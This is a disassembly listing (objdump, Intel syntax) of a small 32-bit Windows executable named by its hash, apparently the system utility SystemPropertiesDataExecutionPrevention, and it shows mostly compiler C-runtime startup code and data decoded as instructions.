
432abbae25f6b91a977bc9f75c4a8edd3bffa5d152d67eb8a358122aa82770e2.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	add    BYTE PTR [eax],al
  401002:	add    BYTE PTR [eax],al
  401004:	xor    BYTE PTR [eax+eax*2],dl
	...
  40100f:	add    BYTE PTR [eax+0x13],ah
  401012:	inc    eax
  401013:	add    BYTE PTR [eax],dh
  401015:	pop    ss
  401016:	inc    eax
  401017:	add    BYTE PTR [eax],al
  401019:	add    BYTE PTR [eax],al
  40101b:	add    BYTE PTR [eax+0x13],ah
  40101e:	add    BYTE PTR [eax],al
  401020:	xor    BYTE PTR [eax+eax*1],dl
  401023:	add    BYTE PTR [eax-0x3fffffea],dh
  401029:	push   ss
  40102a:	add    BYTE PTR [eax],al
  40102c:	loopne 0x401044
  40102e:	add    BYTE PTR [eax],al
  401030:	xor    BYTE PTR [edi],dl
  401032:	add    BYTE PTR [eax],al
  401034:	adc    BYTE PTR [eax],bl
  401036:	add    BYTE PTR [eax],al
  401038:	mov    al,ds:0xd000001a
  40103d:	sbb    al,BYTE PTR [eax]
  40103f:	add    BYTE PTR [eax+0x20],al
  401042:	inc    eax
  401043:	add    BYTE PTR [eax+0x44004020],dl
  401049:	add    BYTE PTR [ebp+0x0],al
  40104c:	push   eax
  40104d:	add    BYTE PTR [eax],al
  40104f:	add    BYTE PTR [eax],al
  401051:	add    BYTE PTR [eax],al
  401053:	add    BYTE PTR [ebx+0x3c],cl
  401056:	lahf   
  401057:	push   ebp
  401058:	add    BYTE PTR [eax],al
  40105a:	add    BYTE PTR [eax],al
  40105c:	add    al,BYTE PTR [eax]
  40105e:	add    BYTE PTR [eax],al
  401060:	inc    esp
  401061:	add    BYTE PTR [eax],al
  401063:	add    BYTE PTR [ecx+edx*1],dl
  401066:	add    BYTE PTR [eax],al
  401068:	adc    al,0x5
  40106a:	add    BYTE PTR [eax],al
  40106c:	add    BYTE PTR [eax],al
  40106e:	add    BYTE PTR [eax],al
  401070:	dec    ebx
  401071:	cmp    al,0x9f
  401073:	push   ebp
  401074:	add    BYTE PTR [eax],al
  401076:	add    BYTE PTR [eax],al
  401078:	or     eax,0xc8000000
  40107d:	add    DWORD PTR [eax],eax
  40107f:	add    BYTE PTR [ecx+edx*1+0x0],ch
  401083:	add    BYTE PTR [ebp+eax*1+0x0],ch
	...
  4010a7:	add    BYTE PTR [eax+0x0],ch
	...
  4010e2:	add    BYTE PTR [eax],al
  4010e4:	add    al,0x20
  4010e6:	inc    eax
  4010e7:	add    BYTE PTR [eax],dl
  4010e9:	adc    DWORD PTR [eax+0x0],eax
  4010ec:	add    DWORD PTR [eax],eax
  4010ee:	add    BYTE PTR [eax],al
  4010f0:	nop
  4010f1:	xor    BYTE PTR [eax+0x0],al
  4010f4:	add    BYTE PTR [eax],al
  4010f6:	add    BYTE PTR [eax],al
  4010f8:	sbb    al,0x10
  4010fa:	inc    eax
  4010fb:	add    BYTE PTR [ecx],cl
  4010fd:	add    BYTE PTR [eax],al
  4010ff:	add    BYTE PTR [eax],al
  401101:	xor    eax,0x0
	...
  40110e:	add    BYTE PTR [eax],al
  401110:	mov    al,ds:0x5200001a
  401115:	push   ebx
  401116:	inc    esp
  401117:	push   ebx
  401118:	xchg   DWORD PTR [esi],esp
  40111a:	test   al,0x97
  40111c:	fiadd  WORD PTR [ecx-0x3e]
  40111f:	dec    edx
  401120:	pop    esi
  401122:	outs   dx,DWORD PTR ds:[esi]
  401123:	stc    
  401124:	test   BYTE PTR [edi+eax*2],0x3b
  401128:	add    DWORD PTR [eax],eax
  40112a:	add    BYTE PTR [eax],al
  40112c:	push   ebx
  40112d:	jns    0x4011a2
  40112f:	je     0x401196
  401131:	ins    DWORD PTR es:[edi],dx
  401132:	push   eax
  401133:	jb     0x4011a4
  401135:	jo     0x40119c
  401137:	jb     0x4011ad
  401139:	imul   esp,DWORD PTR [ebp+0x73],0x61746144
  401140:	inc    ebp
  401141:	js     0x4011a8
  401143:	arpl   WORD PTR [ebp+0x74],si
  401146:	imul   ebp,DWORD PTR [edi+0x6e],0x76657250
  40114d:	outs   dx,BYTE PTR gs:[esi]
  40114f:	je     0x4011ba
  401151:	outs   dx,DWORD PTR ds:[esi]
  401152:	outs   dx,BYTE PTR ds:[esi]
  401153:	cs jo  0x4011ba
  401156:	bound  eax,QWORD PTR [eax]
	...
  40116c:	inc    edi
  40116d:	inc    ebx
  40116e:	push   esp
  40116f:	dec    esp
  401170:	add    BYTE PTR [eax],dl
  401172:	add    BYTE PTR [eax],al
  401174:	add    al,0x0
  401176:	add    BYTE PTR [eax],al
  401178:	cs inc ebx
  40117a:	push   edx
  40117b:	push   esp
  40117c:	and    al,0x58
  40117e:	inc    ebx
  40117f:	inc    ecx
  401180:	add    BYTE PTR [eax],al
  401182:	add    BYTE PTR [eax],al
  401184:	add    al,0x10
  401186:	add    BYTE PTR [eax],al
  401188:	add    al,0x0
  40118a:	add    BYTE PTR [eax],al
  40118c:	cs inc ebx
  40118e:	push   edx
  40118f:	push   esp
  401190:	and    al,0x58
  401192:	inc    ebx
  401193:	inc    ecx
  401194:	inc    ecx
  401195:	add    BYTE PTR [eax],al
  401197:	add    BYTE PTR [eax],cl
  401199:	adc    BYTE PTR [eax],al
  40119b:	add    BYTE PTR [eax+eax*1],al
  40119e:	add    BYTE PTR [eax],al
  4011a0:	cs inc ebx
  4011a2:	push   edx
  4011a3:	push   esp
  4011a4:	and    al,0x58
  4011a6:	inc    ebx
  4011a7:	pop    edx
  4011a8:	add    BYTE PTR [eax],al
  4011aa:	add    BYTE PTR [eax],al
  4011ac:	or     al,0x10
  4011ae:	add    BYTE PTR [eax],al
  4011b0:	add    al,0x0
  4011b2:	add    BYTE PTR [eax],al
  4011b4:	cs inc ebx
  4011b6:	push   edx
  4011b7:	push   esp
  4011b8:	and    al,0x58
  4011ba:	dec    ecx
  4011bb:	inc    ecx
  4011bc:	add    BYTE PTR [eax],al
  4011be:	add    BYTE PTR [eax],al
  4011c0:	adc    BYTE PTR [eax],dl
  4011c2:	add    BYTE PTR [eax],al
  4011c4:	add    al,0x0
  4011c6:	add    BYTE PTR [eax],al
  4011c8:	cs inc ebx
  4011ca:	push   edx
  4011cb:	push   esp
  4011cc:	and    al,0x58
  4011ce:	dec    ecx
  4011cf:	inc    ecx
  4011d0:	inc    ecx
  4011d1:	add    BYTE PTR [eax],al
  4011d3:	add    BYTE PTR [eax+edx*1],dl
  4011d6:	add    BYTE PTR [eax],al
  4011d8:	add    al,0x0
  4011da:	add    BYTE PTR [eax],al
  4011dc:	cs inc ebx
  4011de:	push   edx
  4011df:	push   esp
  4011e0:	and    al,0x58
  4011e2:	dec    ecx
  4011e3:	pop    ecx
  4011e4:	add    BYTE PTR [eax],al
  4011e6:	add    BYTE PTR [eax],al
  4011e8:	sbb    BYTE PTR [eax],dl
  4011ea:	add    BYTE PTR [eax],al
  4011ec:	add    al,0x0
  4011ee:	add    BYTE PTR [eax],al
  4011f0:	cs inc ebx
  4011f2:	push   edx
  4011f3:	push   esp
  4011f4:	and    al,0x58
  4011f6:	dec    ecx
  4011f7:	pop    edx
  4011f8:	add    BYTE PTR [eax],al
  4011fa:	add    BYTE PTR [eax],al
  4011fc:	sbb    al,0x10
  4011fe:	add    BYTE PTR [eax],al
  401200:	and    al,0x0
  401202:	add    BYTE PTR [eax],al
  401204:	imul   sp,WORD PTR cs:[si+0x73],0x7824
  40120c:	add    BYTE PTR [eax],al
  40120e:	add    BYTE PTR [eax],al
  401210:	inc    eax
  401211:	adc    BYTE PTR [eax],al
  401213:	add    al,dl
  401215:	add    BYTE PTR [eax],al
  401217:	add    BYTE PTR [esi],ch
  401219:	jb     0x40127f
  40121b:	popa   
  40121c:	je     0x40127f
  40121e:	add    BYTE PTR [eax],al
  401220:	adc    BYTE PTR [ecx],dl
  401222:	add    BYTE PTR [eax],al
  401224:	add    al,0x0
  401226:	add    BYTE PTR [eax],al
  401228:	cs jb  0x40128f
  40122b:	popa   
  40122c:	je     0x40128f
  40122e:	and    al,0x73
  401230:	js     0x401296
  401232:	popa   
  401233:	je     0x401296
  401235:	add    BYTE PTR [eax],al
  401237:	add    BYTE PTR [ecx+edx*1],dl
  40123a:	add    BYTE PTR [eax],al
  40123c:	and    BYTE PTR [edx],al
  40123e:	add    BYTE PTR [eax],al
  401240:	cs jb  0x4012a7
  401243:	popa   
  401244:	je     0x4012a7
  401246:	and    al,0x7a
  401248:	jp     0x4012c4
  40124a:	bound  esp,QWORD PTR fs:[edi+0x0]
  40124e:	add    BYTE PTR [eax],al
  401250:	inc    eax
  401251:	adc    eax,DWORD PTR [eax]
  401253:	add    BYTE PTR [eax+0x9],al
  401256:	add    BYTE PTR [eax],al
  401258:	cs je  0x4012c0
  40125b:	js     0x4012d1
  40125d:	and    al,0x6d
  40125f:	outs   dx,BYTE PTR ds:[esi]
  401260:	add    BYTE PTR [eax],al
  401262:	add    BYTE PTR [eax],al
  401264:	sbb    BYTE PTR [eax+eax*1],0x0
  401268:	add    BYTE PTR fs:[eax],al
  40126b:	add    BYTE PTR [esi],ch
  40126d:	js     0x4012d3
  40126f:	popa   
  401270:	je     0x4012d3
  401272:	and    al,0x78
  401274:	add    BYTE PTR [eax],al
  401276:	add    BYTE PTR [eax],al
  401278:	add    BYTE PTR [eax],ah
  40127a:	add    BYTE PTR [eax],al
  40127c:	or     al,0x0
  40127e:	add    BYTE PTR [eax],al
  401280:	cs fs popa 
  401283:	je     0x4012e6
  401285:	add    BYTE PTR [eax],al
  401287:	add    BYTE PTR [eax],dl
  401289:	and    BYTE PTR [eax],al
  40128b:	add    BYTE PTR [eax+0x3],ah
  40128e:	add    BYTE PTR [eax],al
  401290:	bound  esi,QWORD PTR cs:[ebx+0x73]
  401294:	add    BYTE PTR [eax],al
  401296:	add    BYTE PTR [eax],al
  401298:	add    BYTE PTR [eax],dh
  40129a:	add    BYTE PTR [eax],al
  40129c:	nop
  40129d:	add    BYTE PTR [eax],al
  40129f:	add    BYTE PTR [esi],ch
  4012a1:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x352461
  4012a9:	add    BYTE PTR [eax],al
  4012ab:	add    BYTE PTR [eax+0x4000030],dl
  4012b1:	add    BYTE PTR [eax],al
  4012b3:	add    BYTE PTR [esi],ch
  4012b5:	xor    BYTE PTR [eax],dh
  4012b7:	arpl   WORD PTR [esi+0x67],sp
  4012ba:	add    BYTE PTR [eax],al
  4012bc:	xchg   esp,eax
  4012bd:	xor    BYTE PTR [eax],al
  4012bf:	add    BYTE PTR [eax+0x2e000000],ah
  4012c5:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x322461
  4012cd:	add    BYTE PTR [eax],al
  4012cf:	add    BYTE PTR [ecx+esi*1],dh
  4012d2:	add    BYTE PTR [eax],al
  4012d4:	adc    al,0x0
  4012d6:	add    BYTE PTR [eax],al
  4012d8:	imul   esp,DWORD PTR cs:[ecx+eiz*2+0x74],0x332461
  4012e1:	add    BYTE PTR [eax],al
  4012e3:	add    BYTE PTR [eax+0x31],cl
  4012e6:	add    BYTE PTR [eax],al
  4012e8:	nop
  4012e9:	add    BYTE PTR [eax],al
  4012eb:	add    BYTE PTR [esi],ch
  4012ed:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x342461
  4012f5:	add    BYTE PTR [eax],al
  4012f7:	add    al,bl
  4012f9:	xor    DWORD PTR [eax],eax
  4012fb:	add    dh,ch
  4012fd:	add    al,BYTE PTR [eax]
  4012ff:	add    BYTE PTR [esi],ch
  401301:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x362461
  401309:	add    BYTE PTR [eax],al
  40130b:	add    BYTE PTR [eax],al
  40130d:	inc    eax
  40130e:	add    BYTE PTR [eax],al
  401310:	xor    BYTE PTR [ebx],al
  401312:	add    BYTE PTR [eax],al
  401314:	cs jb  0x40138a
  401317:	jb     0x40137c
  401319:	and    al,0x30
  40131b:	xor    DWORD PTR [eax],eax
  40131d:	add    BYTE PTR [eax],al
  40131f:	add    BYTE PTR [eax],dh
  401321:	inc    ebx
  401322:	add    BYTE PTR [eax],al
  401324:	jo     0x40134a
  401326:	add    DWORD PTR [eax],eax
  401328:	cs jb  0x40139e
  40132b:	jb     0x401390
  40132d:	and    al,0x30
  40132f:	xor    al,BYTE PTR [eax]
	...
  401345:	push   0x401048
  40134a:	call   DWORD PTR ds:0x403000
  401350:	xor    eax,eax
  401352:	ret    0x10
  401355:	int3   
  401356:	int3   
  401357:	int3   
  401358:	int3   
  401359:	int3   
  40135a:	int3   
  40135b:	int3   
  40135c:	int3   
  40135d:	int3   
  40135e:	int3   
  40135f:	int3   
  401360:	mov    eax,0x5a4d
  401365:	cmp    WORD PTR ds:0x400000,ax
  40136c:	je     0x401372
  40136e:	xor    eax,eax
  401370:	jmp    0x4013c0
  401372:	mov    ecx,DWORD PTR ds:0x40003c
  401378:	cmp    DWORD PTR [ecx+0x400000],0x4550
  401382:	jne    0x40136e
  401384:	movzx  eax,WORD PTR [ecx+0x400018]
  40138b:	cmp    eax,0x10b
  401390:	je     0x4013ac
  401392:	cmp    eax,0x20b
  401397:	jne    0x40136e
  401399:	xor    eax,eax
  40139b:	cmp    DWORD PTR [ecx+0x400084],0xe
  4013a2:	jbe    0x4013c0
  4013a4:	cmp    DWORD PTR [ecx+0x4000f8],eax
  4013aa:	jmp    0x4013bd
  4013ac:	xor    eax,eax
  4013ae:	cmp    DWORD PTR [ecx+0x400074],0xe
  4013b5:	jbe    0x4013c0
  4013b7:	cmp    DWORD PTR [ecx+0x4000e8],eax
  4013bd:	setne  al
  4013c0:	push   0x2
  4013c2:	mov    ds:0x402028,eax
  4013c7:	call   0x4017be
  4013cc:	push   eax
  4013cd:	call   DWORD PTR ds:0x403078
  4013d3:	or     DWORD PTR ds:0x40235c,0xffffffff
  4013da:	or     DWORD PTR ds:0x402360,0xffffffff
  4013e1:	pop    ecx
  4013e2:	pop    ecx
  4013e3:	call   DWORD PTR ds:0x403068
  4013e9:	mov    ecx,DWORD PTR ds:0x40203c
  4013ef:	mov    DWORD PTR [eax],ecx
  4013f1:	call   DWORD PTR ds:0x403084
  4013f7:	mov    ecx,DWORD PTR ds:0x402030
  4013fd:	mov    DWORD PTR [eax],ecx
  4013ff:	call   0x401810
  401404:	cmp    DWORD PTR ds:0x402000,0x0
  40140b:	jne    0x401419
  40140d:	push   0x401810
  401412:	call   DWORD PTR ds:0x403064
  401418:	pop    ecx
  401419:	call   0x401a1f
  40141e:	xor    eax,eax
  401420:	ret    
  401421:	int3   
  401422:	int3   
  401423:	int3   
  401424:	int3   
  401425:	int3   
  401426:	int3   
  401427:	int3   
  401428:	int3   
  401429:	int3   
  40142a:	int3   
  40142b:	int3   
  40142c:	int3   
  40142d:	int3   
  40142e:	int3   
  40142f:	int3   
  401430:	mov    eax,ds:0x402038
  401435:	push   0x40202c
  40143a:	push   DWORD PTR ds:0x402034
  401440:	mov    ds:0x40202c,eax
  401445:	push   0x402020
  40144a:	push   0x40201c
  40144f:	push   0x402018
  401454:	call   DWORD PTR ds:0x40307c
  40145a:	add    esp,0x14
  40145d:	mov    ds:0x402024,eax
  401462:	ret    
  401463:	int3   
  401464:	int3   
  401465:	int3   
  401466:	int3   
  401467:	int3   
  401468:	push   0x5c
  40146a:	push   0x401c80
  40146f:	call   0x401a44
  401474:	and    DWORD PTR [ebp-0x24],0x0
  401478:	and    DWORD PTR [ebp-0x4],0x0
  40147c:	lea    eax,[ebp-0x6c]
  40147f:	push   eax
  401480:	call   DWORD PTR ds:0x40301c
  401486:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  40148d:	xor    ebx,ebx
  40148f:	inc    ebx
  401490:	mov    DWORD PTR [ebp-0x4],ebx
  401493:	mov    eax,fs:0x18
  401499:	mov    edi,DWORD PTR [eax+0x4]
  40149c:	xor    esi,esi
  40149e:	mov    edx,0x402364
  4014a3:	mov    ecx,edi
  4014a5:	xor    eax,eax
  4014a7:	lock cmpxchg DWORD PTR [edx],ecx
  4014ab:	test   eax,eax
  4014ad:	je     0x4014b5
  4014af:	cmp    eax,edi
  4014b1:	jne    0x4014c7
  4014b3:	mov    esi,ebx
  4014b5:	cmp    DWORD PTR ds:0x402368,ebx
  4014bb:	jne    0x4014d4
  4014bd:	push   0x1f
  4014bf:	call   0x4017fa
  4014c4:	pop    ecx
  4014c5:	jmp    0x401503
  4014c7:	push   0x3e8
  4014cc:	call   DWORD PTR ds:0x40303c
  4014d2:	jmp    0x40149e
  4014d4:	cmp    DWORD PTR ds:0x402368,0x0
  4014db:	jne    0x4014fd
  4014dd:	mov    DWORD PTR ds:0x402368,ebx
  4014e3:	push   0x401018
  4014e8:	push   0x40100c
  4014ed:	call   0x401654
  4014f2:	pop    ecx
  4014f3:	pop    ecx
  4014f4:	test   eax,eax
  4014f6:	je     0x401503
  4014f8:	jmp    0x40163d
  4014fd:	mov    DWORD PTR ds:0x402014,ebx
  401503:	cmp    DWORD PTR ds:0x402368,ebx
  401509:	jne    0x401526
  40150b:	push   0x401008
  401510:	push   0x401000
  401515:	call   0x401a38
  40151a:	pop    ecx
  40151b:	pop    ecx
  40151c:	mov    DWORD PTR ds:0x402368,0x2
  401526:	test   esi,esi
  401528:	jne    0x401533
  40152a:	xor    eax,eax
  40152c:	mov    ecx,0x402364
  401531:	xchg   DWORD PTR [ecx],eax
  401533:	cmp    DWORD PTR ds:0x40236c,0x0
  40153a:	je     0x401561
  40153c:	push   0x40236c
  401541:	call   0x401870
  401546:	pop    ecx
  401547:	test   eax,eax
  401549:	je     0x401561
  40154b:	push   0x0
  40154d:	push   0x2
  40154f:	push   0x0
  401551:	mov    esi,DWORD PTR ds:0x40236c
  401557:	mov    ecx,esi
  401559:	call   DWORD PTR ds:0x403090
  40155f:	call   esi
  401561:	mov    eax,ds:0x40305c
  401566:	mov    ecx,DWORD PTR [eax]
  401568:	test   ecx,ecx
  40156a:	je     0x40163d
  401570:	mov    DWORD PTR [ebp-0x20],ecx
  401573:	push   0x20
  401575:	pop    esi
  401576:	mov    edx,DWORD PTR [ebp-0x24]
  401579:	movzx  eax,WORD PTR [ecx]
  40157c:	cmp    ax,si
  40157f:	ja     0x4015d1
  401581:	test   ax,ax
  401584:	je     0x40158a
  401586:	test   edx,edx
  401588:	jne    0x4015d1
  40158a:	movzx  eax,WORD PTR [ecx]
  40158d:	test   ax,ax
  401590:	je     0x40159f
  401592:	cmp    ax,si
  401595:	ja     0x40159f
  401597:	add    ecx,0x2
  40159a:	mov    DWORD PTR [ebp-0x20],ecx
  40159d:	jmp    0x40158a
  40159f:	test   BYTE PTR [ebp-0x40],0x1
  4015a3:	je     0x4015ab
  4015a5:	movzx  eax,WORD PTR [ebp-0x3c]
  4015a9:	jmp    0x4015ae
  4015ab:	push   0xa
  4015ad:	pop    eax
  4015ae:	push   eax
  4015af:	push   ecx
  4015b0:	push   0x0
  4015b2:	push   0x400000
  4015b7:	call   0x401345
  4015bc:	mov    ds:0x402010,eax
  4015c1:	cmp    DWORD PTR ds:0x402028,0x0
  4015c8:	jne    0x401619
  4015ca:	push   eax
  4015cb:	call   DWORD PTR ds:0x403074
  4015d1:	cmp    eax,0x22
  4015d4:	jne    0x4015e2
  4015d6:	xor    eax,eax
  4015d8:	test   edx,edx
  4015da:	sete   al
  4015dd:	mov    edx,eax
  4015df:	mov    DWORD PTR [ebp-0x24],edx
  4015e2:	add    ecx,0x2
  4015e5:	mov    DWORD PTR [ebp-0x20],ecx
  4015e8:	jmp    0x401579
  4015ea:	mov    ecx,DWORD PTR [ebp-0x14]
  4015ed:	mov    eax,DWORD PTR [ecx]
  4015ef:	mov    eax,DWORD PTR [eax]
  4015f1:	mov    DWORD PTR [ebp-0x28],eax
  4015f4:	push   ecx
  4015f5:	push   eax
  4015f6:	call   0x401744
  4015fb:	pop    ecx
  4015fc:	pop    ecx
  4015fd:	ret    
  4015fe:	mov    esp,DWORD PTR [ebp-0x18]
  401601:	mov    eax,DWORD PTR [ebp-0x28]
  401604:	mov    ds:0x402010,eax
  401609:	cmp    DWORD PTR ds:0x402028,0x0
  401610:	jne    0x401619
  401612:	push   eax
  401613:	call   DWORD PTR ds:0x403070
  401619:	cmp    DWORD PTR ds:0x402014,0x0
  401620:	jne    0x40162d
  401622:	call   DWORD PTR ds:0x40306c
  401628:	mov    eax,ds:0x402010
  40162d:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  401634:	jmp    0x401649
  401636:	xor    eax,eax
  401638:	inc    eax
  401639:	ret    
  40163a:	mov    esp,DWORD PTR [ebp-0x18]
  40163d:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  401644:	mov    eax,0xff
  401649:	call   0x401a8c
  40164e:	ret    
  40164f:	int3   
  401650:	int3   
  401651:	int3   
  401652:	int3   
  401653:	int3   
  401654:	mov    edi,edi
  401656:	push   ebp
  401657:	mov    ebp,esp
  401659:	push   ecx
  40165a:	mov    eax,ds:0x402004
  40165f:	xor    eax,ebp
  401661:	mov    DWORD PTR [ebp-0x4],eax
  401664:	push   esi
  401665:	mov    esi,DWORD PTR [ebp+0x8]
  401668:	xor    eax,eax
  40166a:	cmp    esi,DWORD PTR [ebp+0xc]
  40166d:	jae    0x40168d
  40166f:	push   edi
  401670:	test   eax,eax
  401672:	jne    0x40168c
  401674:	mov    edi,DWORD PTR [esi]
  401676:	test   edi,edi
  401678:	je     0x401684
  40167a:	mov    ecx,edi
  40167c:	call   DWORD PTR ds:0x403090
  401682:	call   edi
  401684:	add    esi,0x4
  401687:	cmp    esi,DWORD PTR [ebp+0xc]
  40168a:	jb     0x401670
  40168c:	pop    edi
  40168d:	mov    ecx,DWORD PTR [ebp-0x4]
  401690:	xor    ecx,ebp
  401692:	pop    esi
  401693:	call   0x4016c0
  401698:	mov    esp,ebp
  40169a:	pop    ebp
  40169b:	ret    
  40169c:	int3   
  40169d:	int3   
  40169e:	int3   
  40169f:	int3   
  4016a0:	int3   
  4016a1:	int3   
  4016a2:	int3   
  4016a3:	int3   
  4016a4:	int3   
  4016a5:	int3   
  4016a6:	int3   
  4016a7:	int3   
  4016a8:	int3   
  4016a9:	int3   
  4016aa:	int3   
  4016ab:	int3   
  4016ac:	int3   
  4016ad:	int3   
  4016ae:	int3   
  4016af:	int3   
  4016b0:	call   0x401978
  4016b5:	jmp    0x401468
  4016ba:	int3   
  4016bb:	int3   
  4016bc:	int3   
  4016bd:	int3   
  4016be:	int3   
  4016bf:	int3   
  4016c0:	cmp    ecx,DWORD PTR ds:0x402004
  4016c6:	jne    0x4016cb
  4016c8:	ret    0x0
  4016cb:	jmp    0x401b05
  4016d0:	int3   
  4016d1:	int3   
  4016d2:	int3   
  4016d3:	int3   
  4016d4:	int3   
  4016d5:	int3   
  4016d6:	int3   
  4016d7:	int3   
  4016d8:	int3   
  4016d9:	int3   
  4016da:	int3   
  4016db:	int3   
  4016dc:	int3   
  4016dd:	int3   
  4016de:	int3   
  4016df:	int3   
  4016e0:	mov    edi,edi
  4016e2:	push   ebp
  4016e3:	mov    ebp,esp
  4016e5:	mov    eax,DWORD PTR [ebp+0x8]
  4016e8:	mov    eax,DWORD PTR [eax]
  4016ea:	cmp    DWORD PTR [eax],0xe06d7363
  4016f0:	jne    0x40171d
  4016f2:	cmp    DWORD PTR [eax+0x10],0x3
  4016f6:	jne    0x40171d
  4016f8:	mov    eax,DWORD PTR [eax+0x14]
  4016fb:	cmp    eax,0x19930520
  401700:	je     0x401717
  401702:	cmp    eax,0x19930521
  401707:	je     0x401717
  401709:	cmp    eax,0x19930522
  40170e:	je     0x401717
  401710:	cmp    eax,0x1994000
  401715:	jne    0x40171d
  401717:	call   DWORD PTR ds:0x403058
  40171d:	xor    eax,eax
  40171f:	pop    ebp
  401720:	ret    0x4
  401723:	int3   
  401724:	int3   
  401725:	int3   
  401726:	int3   
  401727:	int3   
  401728:	int3   
  401729:	int3   
  40172a:	int3   
  40172b:	int3   
  40172c:	int3   
  40172d:	int3   
  40172e:	int3   
  40172f:	int3   
  401730:	push   0x4016e0
  401735:	call   DWORD PTR ds:0x40300c
  40173b:	xor    eax,eax
  40173d:	ret    
  40173e:	int3   
  40173f:	int3   
  401740:	int3   
  401741:	int3   
  401742:	int3   
  401743:	int3   
  401744:	jmp    DWORD PTR ds:0x403088
  40174a:	int3   
  40174b:	int3   
  40174c:	int3   
  40174d:	int3   
  40174e:	int3   
  40174f:	push   0xc
  401751:	push   0x401ca8
  401756:	call   0x401c1c
  40175b:	xor    ecx,ecx
  40175d:	mov    eax,DWORD PTR [ebp+0x8]
  401760:	test   eax,eax
  401762:	je     0x4017af
  401764:	cmp    eax,0xffffffff
  401767:	je     0x4017af
  401769:	mov    DWORD PTR [ebp-0x4],ecx
  40176c:	mov    edx,0x5a4d
  401771:	cmp    WORD PTR [eax],dx
  401774:	jne    0x4017a8
  401776:	mov    edx,DWORD PTR [eax+0x3c]
  401779:	test   edx,edx
  40177b:	js     0x4017a8
  40177d:	cmp    edx,0x10000000
  401783:	jae    0x4017a8
  401785:	add    eax,edx
  401787:	mov    DWORD PTR [ebp-0x1c],eax
  40178a:	mov    ecx,DWORD PTR [eax]
  40178c:	sub    ecx,0x4550
  401792:	neg    ecx
  401794:	sbb    ecx,ecx
  401796:	not    ecx
  401798:	and    ecx,eax
  40179a:	jmp    0x4017a5
  40179c:	xor    eax,eax
  40179e:	inc    eax
  40179f:	ret    
  4017a0:	mov    esp,DWORD PTR [ebp-0x18]
  4017a3:	xor    ecx,ecx
  4017a5:	mov    DWORD PTR [ebp-0x1c],ecx
  4017a8:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  4017af:	mov    eax,ecx
  4017b1:	call   0x401c61
  4017b6:	ret    0x4
  4017b9:	int3   
  4017ba:	int3   
  4017bb:	int3   
  4017bc:	int3   
  4017bd:	int3   
  4017be:	mov    edi,edi
  4017c0:	push   ebp
  4017c1:	mov    ebp,esp
  4017c3:	push   0x0
  4017c5:	call   DWORD PTR ds:0x403014
  4017cb:	test   eax,eax
  4017cd:	je     0x4017ef
  4017cf:	push   eax
  4017d0:	call   0x40174f
  4017d5:	test   eax,eax
  4017d7:	je     0x4017ef
  4017d9:	movzx  ecx,WORD PTR [eax+0x5c]
  4017dd:	push   0x2
  4017df:	pop    eax
  4017e0:	cmp    cx,ax
  4017e3:	je     0x4017f2
  4017e5:	cmp    ecx,0x3
  4017e8:	jne    0x4017ef
  4017ea:	xor    eax,eax
  4017ec:	inc    eax
  4017ed:	pop    ebp
  4017ee:	ret    
  4017ef:	mov    eax,DWORD PTR [ebp+0x8]
  4017f2:	pop    ebp
  4017f3:	ret    
  4017f4:	int3   
  4017f5:	int3   
  4017f6:	int3   
  4017f7:	int3   
  4017f8:	int3   
  4017f9:	int3   
  4017fa:	jmp    DWORD PTR ds:0x403080
  401800:	int3   
  401801:	int3   
  401802:	int3   
  401803:	int3   
  401804:	int3   
  401805:	int3   
  401806:	int3   
  401807:	int3   
  401808:	int3   
  401809:	int3   
  40180a:	int3   
  40180b:	int3   
  40180c:	int3   
  40180d:	int3   
  40180e:	int3   
  40180f:	int3   
  401810:	xor    eax,eax
  401812:	ret    
  401813:	int3   
  401814:	int3   
  401815:	int3   
  401816:	int3   
  401817:	int3   
  401818:	int3   
  401819:	int3   
  40181a:	int3   
  40181b:	int3   
  40181c:	int3   
  40181d:	int3   
  40181e:	int3   
  40181f:	int3   
  401820:	mov    edi,edi
  401822:	push   ebp
  401823:	mov    ebp,esp
  401825:	mov    eax,DWORD PTR [ebp+0x8]
  401828:	xor    edx,edx
  40182a:	push   ebx
  40182b:	push   esi
  40182c:	push   edi
  40182d:	mov    ecx,DWORD PTR [eax+0x3c]
  401830:	add    ecx,eax
  401832:	movzx  eax,WORD PTR [ecx+0x14]
  401836:	movzx  ebx,WORD PTR [ecx+0x6]
  40183a:	add    eax,0x18
  40183d:	add    eax,ecx
  40183f:	test   ebx,ebx
  401841:	je     0x40185e
  401843:	mov    edi,DWORD PTR [ebp+0xc]
  401846:	mov    esi,DWORD PTR [eax+0xc]
  401849:	cmp    edi,esi
  40184b:	jb     0x401856
  40184d:	mov    ecx,DWORD PTR [eax+0x8]
  401850:	add    ecx,esi
  401852:	cmp    edi,ecx
  401854:	jb     0x401860
  401856:	inc    edx
  401857:	add    eax,0x28
  40185a:	cmp    edx,ebx
  40185c:	jb     0x401846
  40185e:	xor    eax,eax
  401860:	pop    edi
  401861:	pop    esi
  401862:	pop    ebx
  401863:	pop    ebp
  401864:	ret    
  401865:	int3   
  401866:	int3   
  401867:	int3   
  401868:	int3   
  401869:	int3   
  40186a:	int3   
  40186b:	int3   
  40186c:	int3   
  40186d:	int3   
  40186e:	int3   
  40186f:	int3   
  401870:	mov    edi,edi
  401872:	push   ebp
  401873:	mov    ebp,esp
  401875:	push   0xfffffffe
  401877:	push   0x401cc8
  40187c:	push   0x401aa0
  401881:	mov    eax,fs:0x0
  401887:	push   eax
  401888:	sub    esp,0x8
  40188b:	push   ebx
  40188c:	push   esi
  40188d:	push   edi
  40188e:	mov    eax,ds:0x402004
  401893:	xor    DWORD PTR [ebp-0x8],eax
  401896:	xor    eax,ebp
  401898:	push   eax
  401899:	lea    eax,[ebp-0x10]
  40189c:	mov    fs:0x0,eax
  4018a2:	mov    DWORD PTR [ebp-0x18],esp
  4018a5:	mov    DWORD PTR [ebp-0x4],0x0
  4018ac:	push   0x400000
  4018b1:	call   0x401940
  4018b6:	add    esp,0x4
  4018b9:	test   eax,eax
  4018bb:	je     0x401911
  4018bd:	mov    eax,DWORD PTR [ebp+0x8]
  4018c0:	sub    eax,0x400000
  4018c5:	push   eax
  4018c6:	push   0x400000
  4018cb:	call   0x401820
